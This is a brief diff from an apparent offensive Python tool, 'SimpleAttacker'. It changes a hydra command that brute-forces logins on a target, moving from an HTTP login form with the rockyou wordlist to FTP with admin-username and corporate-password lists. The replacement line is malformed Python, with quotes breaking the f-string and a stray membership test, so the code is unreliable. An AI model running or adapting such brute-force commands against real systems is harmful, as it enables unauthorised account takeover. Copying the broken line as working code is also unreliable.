@@ -290,7 +290,7 @@ class SimpleAttacker:
             self.run_command_live(cmd, "quick_gobuster")
         
         if input("\nCheck for common logins? (y/N): ").strip().lower() == 'y':
-            cmd = f"sudo hydra -t 4 -f -l admin -P /usr/share/wordlists/rockyou.txt {target} http-post-form \"/:user=admin&pass=^PASS^:F=Invalid\""
+            cmd = f"sudo hydra -t 4 -f -L seclists/Usernames/CommonAdminBase64.txt -P /usr/share/seclists/Passwords/corporate_passwords.txt "ftp://" in target "
             self.run_command_live(cmd, "quick_hydra")
         
         print(f"\n✅ Quick scan complete! Check {self.results_dir}")
